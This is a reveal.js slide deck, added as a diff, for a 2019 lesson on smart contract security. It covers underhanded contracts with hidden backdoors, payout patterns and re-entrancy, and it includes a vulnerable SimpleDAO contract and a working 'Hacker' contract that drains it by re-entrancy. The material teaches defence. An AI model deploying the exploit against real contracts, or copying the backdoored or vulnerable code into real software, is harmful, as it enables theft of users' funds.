@@ -1,0 +1,429 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+
+    <title>Introduction to Blockchain Security Practices</title>
+
+    <meta name="author" content="Doug Hoyte">
+
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
+
+    <link rel="stylesheet" href="../reveal.js/css/reveal.css">
+    <link rel="stylesheet" href="../reveal.js/css/theme/black.css" id="theme">
+
+    <!-- Code syntax highlighting -->
+    <link rel="stylesheet" href="../reveal.js/lib/css/zenburn.css">
+
+    <!-- Printing and PDF exports -->
+    <script>
+      var link = document.createElement( 'link' );
+      link.rel = 'stylesheet';
+      link.type = 'text/css';
+      link.href = window.location.search.match( /print-pdf/gi ) ? '../reveal.js/css/print/pdf.css' : '../reveal.js/css/print/paper.css';
+      document.getElementsByTagName( 'head' )[0].appendChild( link );
+    </script>
+
+    <!--[if lt IE 9]>
+    <script src="../reveal.js/lib/js/html5shiv.js"></script>
+    <![endif]-->
+
+    <style>
+      .reveal .slides h1, .reveal .slides h2, .reveal .slides h3 {
+        text-transform: none;
+      }
+
+      .two-column {
+        display: flex;
+        flex-wrap: wrap;
+      }
+
+      .two-column em {
+        margin: 20px;
+      }
+
+      .reveal .big-and-bold {
+        font-weight: bold;
+        font-size: 135%;
+      }
+
+      .reveal .shrunk-a-bit {
+        font-size: 90%;
+      }
+
+      .reveal .shrunk-a-bit pre {
+        width: 100%;
+      }
+
+      .reveal pre {
+        width: 100%;
+      }
+
+      .reveal .highlight {
+        color: yellow;
+        font-weight: bold;
+      }
+
+      .reveal .highlightRed {
+        color: red;
+        font-weight: bold;
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="reveal">
+      <div class="slides">
+
+<!------------------------------------------------------->
+
+
+
+<section data-markdown><script type="text/template">
+
+## Introduction to Blockchain Security Practices
+
+### Lesson 4: Smart Contract Security
+
+*Doug Hoyte, March 2019*
+
+[https://is.gd/blockchainsec](https://is.gd/blockchainsec)
+
+</script></section>
+
+
+
+<section data-markdown><script type="text/template">
+
+## Lesson Topics
+
+* Attack models
+* Inter-contract interaction
+* On-chain randomness
+
+</script></section>
+
+
+
+
+<section data-markdown><script type="text/template">
+
+## Attack models
+
+* Model 1: Contract writer is trusted
+  * Must worry about all bugs we've discussed so far (overflows, visibility, etc)
+* Model 2: Contract writer is malicious
+  * *Underhanded* contracts
+  * Must worry about everything in model 1, as well as possibility contract writer added a hidden back-door
+
+</script></section>
+
+
+
+<section data-markdown><script type="text/template">
+
+## Way too obvious:
+
+<pre class="hljs js">
+    function soLongSuckers() {
+        owner.transfer(address(this).balance);
+    }
+</pre>
+
+</script></section>
+
+
+
+<section data-markdown><script type="text/template">
+
+## What about this?
+
+<pre class="hljs js">
+    uint256 ownerReward;
+
+    function claimOwnerReward(uint256 amount) public onlyOwner {
+        require(amount <= ownerReward, "too much");
+        ownerReward =- amount;
+        owner.transfer(amount);
+    }
+</pre>
+
+</script></section>
+
+
+
+<section data-markdown><script type="text/template">
+
+## Plausible deniability
+
+<pre class="hljs js">
+    uint256 ownerReward;
+
+    function claimOwnerReward(uint256 amount) public onlyOwner {
+        require(amount <= ownerReward, "too much");
+        ownerReward <span class="highlightRed">=-</span> amount;
+        owner.transfer(amount);
+    }
+</pre>
+
+* This bug lets owner drain the contract
+* But if detected, the owner can claim:
+  * *Oops sorry! It was just a typo, I wasn't trying to steal your money, I promise!*
+
+</script></section>
+
+
+
+<section data-markdown><script type="text/template">
+
+## Contract upgrades
+
+* Some contracts are designed so they can be *upgraded*
+* In this case, the owner can modify the code of the contract, but preserve balances, token allowances, etc
+  * **Good**: Owner can fix bugs in the contract before bad guys can exploit them
+  * **Bad**: If owner is a bad guy, can add in new exploits later on
+
+</script></section>
+
+
+<section data-markdown><script type="text/template">
+ 
+## Proxy contracts
+ 
+* Upgradable contracts are implemented using proxy contracts
+* A simple contract lives at a stable address
+* It forwards all requests to another contract, at an address that can be changed by the owner
+* Inter-contract interaction like this needs to be considered carefully from a security perspective
+
+</script></section>
+
+
+
+
+
+
+<section data-markdown><script type="text/template">
+
+## Sending payouts
+
+* Suppose you need to send payouts to two addresses:
+<pre class="hljs js">
+    addr1.transfer(payout1);
+    addr2.transfer(payout2);
+</pre>
+* If `addr2` is the address of a contract, it could have a fallback function:
+<pre class="hljs js">
+    function () {
+        require(false);
+    }
+</pre>
+* `addr1`'s payout would be stuck (see [King of the Ether](https://www.kingoftheether.com/postmortem.html))
+
+</script></section>
+
+
+
+<section data-markdown><script type="text/template">
+
+## Withdrawal pattern
+
+* It is better to record how much each address is owed, and allow each address to claim their payout separately:
+<pre class="hljs js">
+    balances[addr1] += payout1;
+    balances[addr2] += payout2;
+</pre>
+
+<pre class="hljs js">
+    function withdraw() {
+        uint256 amount = balances[msg.sender];
+        balance[msg.sender] = 0;
+        msg.sender.transfer(amount);
+    }
+</pre>
+
+</script></section>
+
+
+
+<section data-markdown><script type="text/template">
+
+## Different ways to send ETH
+
+* `address.transfer(amount)`
+  * Throws on failure
+  * Forwards 2,300 gas stipend
+  * Use this whenever possible
+* `address.send(amount)`
+  * Returns false on failure
+  * Forwards 2,300 gas stipend
+* `address.call.value(amount)("")`
+  * returns false on failure
+  * Forwards all available gas
+
+</script></section>
+
+
+
+
+<section data-markdown><script type="text/template">
+
+## 15 minute break
+
+</script></section>
+
+
+
+<section data-markdown><script type="text/template">
+
+## Autonomous agents
+
+* Contracts are just like regular accounts
+  * They have balance
+  * They can send and receive ETH
+  * They are allowed to call functions in other contracts
+  * They are allowed to create other contracts
+
+</script></section>
+
+
+
+<section data-markdown><script type="text/template">
+
+## Forwarding gas
+
+* We noted above that `transfer` forwards 2,300 gas
+* If sending to a contract, this lets the fallback function run a little bit of code
+* Why would we want to do this?
+  * The fallback function may want to record something when it accepts ETH
+  * Sending ETH is a special case of calling another contract
+
+</script></section>
+
+
+
+<section data-markdown><script type="text/template">
+
+## Re-entrancy
+
+* When a function calls itself (usually indirectly)
+* Typical flow:
+  * Contract A calls contract B
+  * Contract B calls *back into* contract A
+
+</script></section>
+
+
+
+<section data-markdown><script type="text/template">
+
+## SimpleDAO
+
+<pre class="hljs js">
+pragma solidity ^0.5.0;
+
+contract SimpleDAO {
+    mapping (address => uint) public balance;
+  
+    function deposit() public payable {
+        balance[msg.sender] += msg.value;
+    }
+
+    function withdraw(uint amount) public {
+       require(balance[msg.sender] >= amount, "no balance");
+       msg.sender.call.value(amount)("");
+       balance[msg.sender] -= amount;
+    }
+}
+</pre>
+
+</script></section>
+
+
+
+
+<section data-markdown><script type="text/template">
+
+<pre class="hljs js">
+pragma solidity ^0.5.0;
+
+contract SimpleDaoInterface {
+    function deposit() public payable;
+    function withdraw(uint amount) public;
+}
+
+contract Hacker {
+    address simpleDaoAddr;
+    
+    function hack(address addr) public payable {
+        simpleDaoAddr = addr;
+
+        SimpleDaoInterface simpleDao = SimpleDaoInterface(simpleDaoAddr);
+        simpleDao.deposit.value(1 ether)();
+        simpleDao.withdraw(1 ether);
+        
+        selfdestruct(msg.sender);
+    }
+
+    function () external payable {
+        uint256 balance = simpleDaoAddr.balance;
+        if (balance == 0) return;
+        if (balance > 1 ether) balance = 1 ether;
+        SimpleDaoInterface simpleDao = SimpleDaoInterface(simpleDaoAddr);
+        simpleDao.withdraw(balance);
+    }
+}
+</pre>
+
+</script></section>
+
+
+<section data-markdown><script type="text/template">
+
+## End of lesson
+
+</script></section>
+
+
+<!------------------------------------------------------->
+
+
+      </div>
+
+    </div>
+
+    <script src="../reveal.js/lib/js/head.min.js"></script>
+    <script src="../reveal.js/js/reveal.js"></script>
+
+    <script>
+
+      // Full list of configuration options available at:
+      // https://github.com/hakimel/reveal.js#configuration
+      Reveal.initialize({
+        controls: true,
+        progress: true,
+        history: true,
+        center: true,
+
+        transition: 'none', // none/fade/slide/convex/concave/zoom
+
+	math: {
+          mathjax: '../lib/MathJax/MathJax.js',
+          config: 'TeX-AMS_SVG-full',
+	},
+
+        // Optional reveal.js plugins
+        dependencies: [
+          { src: '../reveal.js/plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+          { src: '../reveal.js/plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+          { src: '../reveal.js/plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
+          { src: '../reveal.js/plugin/math/math.js', async: true },
+        ]
+      });
+
+    </script>
+
+  </body>
+</html>
